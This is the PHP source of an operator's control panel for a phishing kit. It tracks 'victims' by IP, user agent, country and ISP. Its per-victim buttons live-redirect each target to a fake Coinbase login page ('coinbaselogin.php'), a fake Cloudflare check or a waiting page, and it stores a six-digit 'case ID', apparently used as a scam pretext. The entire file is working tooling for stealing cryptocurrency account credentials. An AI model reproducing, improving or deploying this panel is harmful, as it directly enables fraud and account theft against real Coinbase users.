<?php
// ==================== PROTECTION START ====================
session_start();
require_once __DIR__ . '/admin/auth.php';

if (!is_logged_in()) {
    header('Location: /admin/login.php');
    exit;
}

require_once __DIR__ . '/blocker-raw.php';

// Initialize database connection FIRST
$database = new Database();
$db = $database->getConnection();

// Create/Update necessary tables
try {
    // First, create the table if it doesn't exist with all required columns
    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
        id SERIAL PRIMARY KEY,
        command VARCHAR(50) NOT NULL,
        target TEXT NOT NULL,
        victim_ip VARCHAR(45) NOT NULL DEFAULT '0.0.0.0',
        expires_at TIMESTAMP DEFAULT (NOW() + INTERVAL '30 seconds'),
        executed BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_table);
    
    // Check and add missing columns
    $columns_to_check = ['victim_ip', 'expires_at', 'executed'];
    
    foreach ($columns_to_check as $column) {
        $check_column = "SELECT column_name FROM information_schema.columns 
                        WHERE table_name = 'redirect_commands' AND column_name = :column_name";
        $stmt = $db->prepare($check_column);
        $stmt->execute([':column_name' => $column]);
        $column_exists = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$column_exists) {
            switch($column) {
                case 'victim_ip':
                    $alter_sql = "ALTER TABLE redirect_commands ADD COLUMN victim_ip VARCHAR(45) NOT NULL DEFAULT '0.0.0.0'";
                    break;
                case 'expires_at':
                    $alter_sql = "ALTER TABLE redirect_commands ADD COLUMN expires_at TIMESTAMP DEFAULT (NOW() + INTERVAL '30 seconds')";
                    break;
                case 'executed':
                    $alter_sql = "ALTER TABLE redirect_commands ADD COLUMN executed BOOLEAN DEFAULT FALSE";
                    break;
            }
            
            if (isset($alter_sql)) {
                $db->exec($alter_sql);
                error_log("Added missing column: " . $column);
            }
        }
    }
    
    // Create case_settings table
    $create_case_table = "CREATE TABLE IF NOT EXISTS case_settings (
        id SERIAL PRIMARY KEY,
        setting_name VARCHAR(100) UNIQUE NOT NULL,
        setting_value TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_case_table);
    
    // Create victims table
    $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) NOT NULL,
        user_agent TEXT,
        country VARCHAR(100),
        isp VARCHAR(200),
        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        status VARCHAR(20) DEFAULT 'active',
        page_visited VARCHAR(255) DEFAULT 'index.php',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_victims_table);
    
} catch (Exception $e) {
    error_log("Table creation error: " . $e->getMessage());
}

// Handle logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    logout();
    header('Location: /admin/login.php');
    exit;
}

// Handle all POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle redirect commands
    if (isset($_POST['redirect_command'])) {
        $command = $_POST['redirect_command'];
        $victim_ip = $_POST['victim_ip'] ?? null;
        
        if (!$victim_ip) {
            $_SESSION['error_message'] = 'No victim IP specified';
            header('Location: /panel.php');
            exit;
        }
        
        try {
            switch($command) {
                case 'redirect_to_coinbase':
                    $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
                             VALUES ('redirect', 'coinbaselogin.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
                    $stmt = $db->prepare($query);
                    $stmt->execute([':victim_ip' => $victim_ip]);
                    $_SESSION['success_message'] = 'Redirect command sent to Coinbase for IP: ' . $victim_ip;
                    break;
                    
                case 'redirect_to_cloudflare':
                    $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
                             VALUES ('redirect', 'index.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
                    $stmt = $db->prepare($query);
                    $stmt->execute([':victim_ip' => $victim_ip]);
                    $_SESSION['success_message'] = 'Redirect command sent to Cloudflare for IP: ' . $victim_ip;
                    break;

                case 'redirect_to_waiting':
                    $query = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
                             VALUES ('redirect', 'waiting.php', :victim_ip, NOW() + INTERVAL '30 seconds')";
                    $stmt = $db->prepare($query);
                    $stmt->execute([':victim_ip' => $victim_ip]);
                    $_SESSION['success_message'] = 'Redirect command sent to Waiting Page for IP: ' . $victim_ip;
                    break;
                    
                case 'clear_redirect':
                    $query = "DELETE FROM redirect_commands WHERE victim_ip = :victim_ip";
                    $stmt = $db->prepare($query);
                    $stmt->execute([':victim_ip' => $victim_ip]);
                    $_SESSION['success_message'] = 'Redirects cleared for IP: ' . $victim_ip;
                    break;
            }
        } catch (Exception $e) {
            error_log("Redirect command error: " . $e->getMessage());
            $_SESSION['error_message'] = 'Error executing command: ' . $e->getMessage();
        }
    }

    // Handle case ID management
    if (isset($_POST['case_id_action'])) {
        $case_id_action = $_POST['case_id_action'];
        
        switch($case_id_action) {
            case 'set_case_id':
                $case_id = $_POST['case_id'] ?? '';
                if (!empty($case_id) && strlen($case_id) === 6 && is_numeric($case_id)) {
                    $query = "INSERT INTO case_settings (setting_name, setting_value, created_at) 
                             VALUES ('current_case_id', :case_id, NOW())
                             ON CONFLICT (setting_name) 
                             DO UPDATE SET setting_value = :case_id, created_at = NOW()";
                    $stmt = $db->prepare($query);
                    $stmt->execute([':case_id' => $case_id]);
                    $_SESSION['success_message'] = 'Case ID set to: ' . $case_id;
                } else {
                    $_SESSION['error_message'] = 'Please enter a valid 6-digit case ID';
                }
                break;
                
            case 'clear_case_id':
                $query = "DELETE FROM case_settings WHERE setting_name = 'current_case_id'";
                $db->exec($query);
                $_SESSION['success_message'] = 'Case ID cleared';
                break;
        }
    }
    
    header('Location: /panel.php');
    exit;
}

// Clean up expired redirect commands
try {
    $cleanup_query = "DELETE FROM redirect_commands WHERE expires_at < NOW() OR executed = TRUE";
    $db->exec($cleanup_query);
} catch (Exception $e) {
    error_log("Cleanup error: " . $e->getMessage());
}

// Get current case ID
$current_case_id = '';
try {
    $case_query = "SELECT setting_value FROM case_settings WHERE setting_name = 'current_case_id'";
    $case_stmt = $db->query($case_query);
    $case_result = $case_stmt->fetch(PDO::FETCH_ASSOC);
    $current_case_id = $case_result ? $case_result['setting_value'] : '';
} catch (Exception $e) {
    error_log("Failed to get case ID: " . $e->getMessage());
}

// Get active victims (last 2 minutes for real-time)
$active_victims = [];
try {
    $active_victims_query = "SELECT * FROM victims 
                            WHERE last_activity > NOW() - INTERVAL '2 minutes' 
                            AND status = 'active'
                            ORDER BY last_activity DESC";
    $active_victims_stmt = $db->query($active_victims_query);
    $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    error_log("Failed to get active victims: " . $e->getMessage());
}

// Get total victims count
$total_victims = 0;
try {
    $total_victims_query = "SELECT COUNT(*) as total FROM victims";
    $total_victims_stmt = $db->query($total_victims_query);
    $total_victims_result = $total_victims_stmt->fetch(PDO::FETCH_ASSOC);
    $total_victims = $total_victims_result ? $total_victims_result['total'] : 0;
} catch (Exception $e) {
    $total_victims = 0;
}

// Handle messages from session
if (isset($_SESSION['success_message'])) {
    $success_message = $_SESSION['success_message'];
    unset($_SESSION['success_message']);
}

if (isset($_SESSION['error_message'])) {
    $error_message = $_SESSION['error_message'];
    unset($_SESSION['error_message']);
}
// ==================== PROTECTION END ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Redirect Control Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        :root {
            --primary-color: #2196F3;
            --background-color: #303030;
            --surface-color: #424242;
            --text-color-light: #ffffff;
            --success-color: #4CAF50;
            --warning-color: #FF9800;
        }
        body {
            background-color: var(--background-color);
            color: var(--text-color-light);
            font-family: 'Roboto', sans-serif;
        }
        .card {
            background-color: var(--surface-color);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .victim-table {
            width: 100%;
            border-collapse: collapse;
        }
        .victim-table th, .victim-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .live-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: #00ff00;
            margin-right: 5px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        .btn-small {
            padding: 0 8px;
            font-size: 11px;
            height: 24px;
            line-height: 24px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .stat-number {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .stat-label {
            font-size: 12px;
            opacity: 0.8;
        }
        .ip-address {
            font-family: monospace;
            background: rgba(255,255,255,0.1);
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 12px;
        }
        .refresh-controls {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .refresh-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }
        .refresh-btn:hover {
            background: #1976D2;
        }
        .refresh-btn.auto-refresh {
            background: #4CAF50;
        }
        .refresh-btn.auto-refresh:hover {
            background: #45a049;
        }
        .refresh-btn.paused {
            background: #FF9800;
        }
        .refresh-btn.paused:hover {
            background: #e68900;
        }
    </style>
</head>
<body>
    <nav>
        <div class="nav-wrapper container">
            <a href="#" class="brand-logo">🛡️ Live Control Panel</a>
            <ul class="right">
                <li><span>Welcome, <?php echo $_SESSION['username']; ?></span></li>
                <li><a href="?action=logout">Logout</a></li>
            </ul>
        </div>
    </nav>

    <main class="container">
        <?php if (isset($success_message)): ?>
            <div class="card-panel green" style="color: white;"><?php echo $success_message; ?></div>
        <?php endif; ?>
        <?php if (isset($error_message)): ?>
            <div class="card-panel red" style="color: white;"><?php echo $error_message; ?></div>
        <?php endif; ?>

        <!-- Live Stats -->
        <div class="card">
            <h5>📊 Live Overview <span class="live-indicator"></span></h5>
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number"><?php echo count($active_victims); ?></div>
                    <div class="stat-label">Live Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo $total_victims; ?></div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo $current_case_id ?: 'Not Set'; ?></div>
                    <div class="stat-label">Case ID</div>
                </div>
            </div>
        </div>

        <!-- Live Victims -->
        <div class="card">
            <h5>👥 Live Victims <span class="live-indicator"></span></h5>
            <?php if (count($active_victims) > 0): ?>
                <table class="victim-table">
                    <thead>
                        <tr>
                            <th>IP Address</th>
                            <th>Current Page</th>
                            <th>Last Activity</th>
                            <th>Live Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($active_victims as $victim): ?>
                            <tr>
                                <td>
                                    <span class="live-indicator"></span>
                                    <span class="ip-address"><?php echo htmlspecialchars($victim['ip_address']); ?></span>
                                </td>
                                <td>
                                    <span class="badge"><?php echo htmlspecialchars($victim['page_visited']); ?></span>
                                </td>
                                <td>
                                    <?php 
                                    $last_activity = strtotime($victim['last_activity']);
                                    $time_diff = time() - $last_activity;
                                    echo '<small>' . floor($time_diff) . ' seconds ago</small>';
                                    ?>
                                </td>
                                <td>
                                    <div class="action-buttons">
                                        <!-- Instant Redirect Actions -->
                                        <form method="POST" style="display: inline;">
                                            <input type="hidden" name="victim_ip" value="<?php echo $victim['ip_address']; ?>">
                                            <input type="hidden" name="redirect_command" value="redirect_to_coinbase">
                                            <button type="submit" class="btn-small green">
                                                ➡️ Coinbase
                                            </button>
                                        </form>
                                        <form method="POST" style="display: inline;">
                                            <input type="hidden" name="victim_ip" value="<?php echo $victim['ip_address']; ?>">
                                            <input type="hidden" name="redirect_command" value="redirect_to_cloudflare">
                                            <button type="submit" class="btn-small blue">
                                                🔄 Cloudflare
                                            </button>
                                        </form>
                                        <form method="POST" style="display: inline;">
                                            <input type="hidden" name="victim_ip" value="<?php echo $victim['ip_address']; ?>">
                                            <input type="hidden" name="redirect_command" value="redirect_to_waiting">
                                            <button type="submit" class="btn-small orange">
                                                ⏳ Waiting
                                            </button>
                                        </form>
                                        <form method="POST" style="display: inline;">
                                            <input type="hidden" name="victim_ip" value="<?php echo $victim['ip_address']; ?>">
                                            <input type="hidden" name="redirect_command" value="clear_redirect">
                                            <button type="submit" class="btn-small red">
                                                ❌ Clear
                                            </button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <p>No live victims detected. Victims will appear here when they visit your site.</p>
            <?php endif; ?>
        </div>

        <!-- Case ID Management -->
        <div class="card">
            <h5>🔐 Case ID Management</h5>
            <form method="POST">
                <div class="row">
                    <div class="col s8">
                        <input type="text" name="case_id" placeholder="Enter 6-digit case ID" 
                               value="<?php echo htmlspecialchars($current_case_id); ?>" 
                               maxlength="6" pattern="[0-9]{6}" required>
                    </div>
                    <div class="col s4">
                        <input type="hidden" name="case_id_action" value="set_case_id">
                        <button type="submit" class="btn green" style="width: 100%;">
                            Set Case ID
                        </button>
                    </div>
                </div>
            </form>
            <form method="POST" style="margin-top: 10px;">
                <input type="hidden" name="case_id_action" value="clear_case_id">
                <button type="submit" class="btn orange" style="width: 100%;">
                    Clear Case ID
                </button>
            </form>
        </div>

        <!-- Refresh Controls -->
        <div class="refresh-controls">
            <button class="refresh-btn" onclick="window.location.reload()" title="Manual Refresh">
                🔄
            </button>
            <button class="refresh-btn paused" id="autoRefreshBtn" onclick="toggleAutoRefresh()" title="Enable Auto Refresh (3s)">
                ⏸️
            </button>
        </div>

        <script>
            let autoRefreshEnabled = false;
            let refreshInterval;

            function toggleAutoRefresh() {
                const btn = document.getElementById('autoRefreshBtn');
                
                if (autoRefreshEnabled) {
                    // Disable auto-refresh
                    clearInterval(refreshInterval);
                    btn.classList.remove('auto-refresh');
                    btn.classList.add('paused');
                    btn.innerHTML = '⏸️';
                    btn.title = 'Enable Auto Refresh (3s)';
                    autoRefreshEnabled = false;
                } else {
                    // Enable auto-refresh
                    refreshInterval = setInterval(function() {
                        window.location.reload();
                    }, 3000);
                    btn.classList.remove('paused');
                    btn.classList.add('auto-refresh');
                    btn.innerHTML = '🔄';
                    btn.title = 'Auto Refresh Enabled (3s) - Click to Stop';
                    autoRefreshEnabled = true;
                }
            }

            // Optional: Start with auto-refresh disabled
            // To enable by default, uncomment the line below:
            // toggleAutoRefresh();
        </script>
    </main>
</body>
</html>
